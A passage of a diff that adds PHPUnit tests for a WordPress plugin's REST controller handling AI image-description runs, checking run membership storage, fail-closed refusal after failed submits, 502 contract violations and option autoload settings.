+        $this->assertIsArray(get_option($membershipKey, false));
+        // Index never persisted (forced failure).
+        $this->assertFalse(get_option($indexKey, false));
+        // Retry once → two update_option attempts on the index key.
+        $this->assertSame(2, $GLOBALS['__ac_update_option_calls'][$indexKey] ?? 0);
+        // Condition is not swallowed.
+        $log = $this->getErrorLog();
+        $this->assertNotEmpty($log);
+        $this->assertTrue(
+            (bool) array_filter(
+                $log,
+                static fn (string $line): bool => str_contains($line, 'media_ids index write failed')
+                    && str_contains($line, $runId)
+            ),
+            'Expected telemetry log naming the failed index write and run_id'
+        );
+    }
+
+    /**
+     * BR-146: membership is stored only on a successful submit (status < 400).
+     * An upstream 500 that echoes a run_id must not plant an authorization record.
+     * Goes RED if the guard stores whenever the body is a WP_REST_Response.
+     */
+    public function testFailedSubmitDoesNotStoreMembershipEvenWithRunId(): void
+    {
+        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
+        $runId = '11111111-1111-1111-1111-111111111146';
+        $this->queueHttpResponse([
+            'response' => ['code' => 500, 'message' => 'Internal Server Error'],
+            'body' => json_encode([
+                'run_id' => $runId,
+                'detail' => 'upstream exploded after assigning a run_id',
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
+        $request->set_param('media_ids', [101]);
+        $response = $this->controller->submit_describe_run($request);
+
+        $this->assertInstanceOf(\WP_REST_Response::class, $response);
+        $this->assertSame(500, $response->get_status());
+        $this->assertFalse(get_option('acx_describe_run_media_ids_' . $runId, false));
+        $index = get_option('acx_describe_run_media_ids_index', []);
+        if (is_array($index)) {
+            $this->assertArrayNotHasKey($runId, $index);
+        }
+
+        // Subsequent apply of that run id is refused (fail closed).
+        $this->queueRunStatusResponse($runId, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => json_encode([
+                'tenant_id' => self::currentTenantId(),
+                'run_id' => $runId,
+                'items' => [
+                    [
+                        'media_id' => 101,
+                        'status' => 'completed',
+                        'alt_text_draft' => 'should not apply',
+                        'caption' => null,
+                        'provenance' => ['adapter' => 'florence'],
+                    ],
+                ],
+            ]),
+        ]);
+        $apply = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $apply->set_param('run_id', $runId);
+        $applyResponse = $this->controller->apply_describe_run_drafts($apply);
+        $this->assertInstanceOf(\WP_Error::class, $applyResponse);
+        $this->assertSame('describe_run_media_ids_unknown', $applyResponse->get_error_code());
+    }
+
+    /**
+     * BR-145: non-array items must yield the 502 contract violation on GET /items
+     * and on apply — not a PHP TypeError fatal during enrichment.
+     */
+    public function testNonArrayItemReturnsContractViolationOnItemsAndApply(): void
+    {
+        $runId = '11111111-1111-1111-1111-111111111145';
+        $nonArrayBody = json_encode([
+            'tenant_id' => self::currentTenantId(),
+            'run_id' => $runId,
+            'items' => ['not-an-object'],
+        ]);
+
+        // GET /items
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => $nonArrayBody,
+        ]);
+        $itemsReq = new WP_REST_Request('GET', '/acx/v1/recognition/describe/runs/' . $runId . '/items');
+        $itemsReq->set_param('run_id', $runId);
+        $itemsResponse = $this->controller->get_describe_run_items($itemsReq);
+        $this->assertInstanceOf(\WP_Error::class, $itemsResponse);
+        $this->assertSame('describe_run_items_contract_violation', $itemsResponse->get_error_code());
+        $this->assertSame(502, $itemsResponse->get_error_data()['status'] ?? null);
+
+        // POST /apply — enrichment runs via get_describe_run_items before the loop.
+        $this->plantSubmittedMediaIds($runId, [70]);
+        $this->queueRunStatusResponse($runId, 'completed');
+        $this->queueHttpResponse([
+            'response' => ['code' => 200, 'message' => 'OK'],
+            'body' => $nonArrayBody,
+        ]);
+        $apply = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs/' . $runId . '/apply');
+        $apply->set_param('run_id', $runId);
+        $applyResponse = $this->controller->apply_describe_run_drafts($apply);
+        $this->assertInstanceOf(\WP_Error::class, $applyResponse);
+        $this->assertSame('describe_run_items_contract_violation', $applyResponse->get_error_code());
+        $this->assertSame(502, $applyResponse->get_error_data()['status'] ?? null);
+    }
+
+    /**
+     * BR-147: when a matching membership record already exists, update_option's
+     * false (forced failure *or* unchanged value) is recovered — submit succeeds.
+     * Goes RED if the recovery branch is missing or the stub never returns false
+     * for identical writes.
+     */
+    public function testSubmitSucceedsWhenMatchingMembershipAlreadyPresent(): void
+    {
+        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
+        $runId = '11111111-1111-1111-1111-111111111147';
+        $optionKey = 'acx_describe_run_media_ids_' . $runId;
+
+        // Plant a matching record, then force the write to fail so recovery fires.
+        update_option(
+            $optionKey,
+            [
+                'media_ids' => [101],
+                'created_at' => time() - 60,
+            ],
+            false
+        );
+        $GLOBALS['__ac_update_option_fail'][$optionKey] = true;
+
+        $this->queueHttpResponse([
+            'response' => ['code' => 202, 'message' => 'Accepted'],
+            'body' => json_encode([
+                'run_id' => $runId,
+                'status' => 'pending',
+                'phase' => 'queued',
+                'completed' => 0,
+                'failed' => 0,
+                'skipped' => 0,
+                'total' => 1,
+                'cancel_requested' => false,
+                'gpu_state' => null,
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
+        $request->set_param('media_ids', [101]);
+        $response = $this->controller->submit_describe_run($request);
+
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
+        $this->assertSame(202, $response->get_status());
+        $this->assertIsArray(get_option($optionKey, false));
+    }
+
+    /**
+     * BR-147: membership option must be written with autoload=false.
+     * Goes RED if store_run_media_ids drops the third arg or passes true.
+     */
+    public function testMembershipOptionWrittenWithoutAutoload(): void
+    {
+        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
+        $runId = '11111111-1111-1111-1111-111111111157';
+        $this->queueHttpResponse([
+            'response' => ['code' => 202, 'message' => 'Accepted'],
+            'body' => json_encode([
+                'run_id' => $runId,
+                'status' => 'pending',
+                'phase' => 'queued',
+                'completed' => 0,
+                'failed' => 0,
+                'skipped' => 0,
+                'total' => 1,
+                'cancel_requested' => false,
+                'gpu_state' => null,
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
+        $request->set_param('media_ids', [101]);
+        $response = $this->controller->submit_describe_run($request);
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
+
+        $optionKey = 'acx_describe_run_media_ids_' . $runId;
+        $this->assertArrayHasKey($optionKey, $GLOBALS['__ac_option_autoload'] ?? []);
+        $this->assertFalse($GLOBALS['__ac_option_autoload'][$optionKey]);
+        $this->assertArrayHasKey('acx_describe_run_media_ids_index', $GLOBALS['__ac_option_autoload'] ?? []);
+        $this->assertFalse($GLOBALS['__ac_option_autoload']['acx_describe_run_media_ids_index']);
+    }
+
+    /**
+     * BR-147: media_ids equality uses array_values() so a list stored under
+     * non-contiguous keys still matches. Goes RED if the compare drops
+     * array_values() and rejects a value-equal but key-shifted record.
+     */
+    public function testMembershipRecoveryComparesMediaIdsByValueNotKeys(): void
+    {
+        $this->plantAttachment(101, "\xff\xd8\xff\xe0jpeg-101", 'jpg');
+        $this->plantAttachment(202, "\xff\xd8\xff\xe0jpeg-202", 'jpg');
+        $runId = '11111111-1111-1111-1111-111111111167';
+        $optionKey = 'acx_describe_run_media_ids_' . $runId;
+
+        // Plant with non-contiguous keys (not 0..n) — equal after array_values().
+        update_option(
+            $optionKey,
+            [
+                'media_ids' => [2 => 101, 5 => 202],
+                'created_at' => time() - 30,
+            ],
+            false
+        );
+        // Force false so the recovery / equality branch must fire.
+        $GLOBALS['__ac_update_option_fail'][$optionKey] = true;
+
+        $this->queueHttpResponse([
+            'response' => ['code' => 202, 'message' => 'Accepted'],
+            'body' => json_encode([
+                'run_id' => $runId,
+                'status' => 'pending',
+                'phase' => 'queued',
+                'completed' => 0,
+                'failed' => 0,
+                'skipped' => 0,
+                'total' => 2,
+                'cancel_requested' => false,
+                'gpu_state' => null,
+            ]),
+        ]);
+
+        $request = new WP_REST_Request('POST', '/acx/v1/recognition/describe/runs');
+        $request->set_param('media_ids', [101, 202]);
+        $response = $this->controller->submit_describe_run($request);
+
+        $this->assertNotInstanceOf(\WP_Error::class, $response);
+        $this->assertSame(202, $response->get_status());
     }
 }
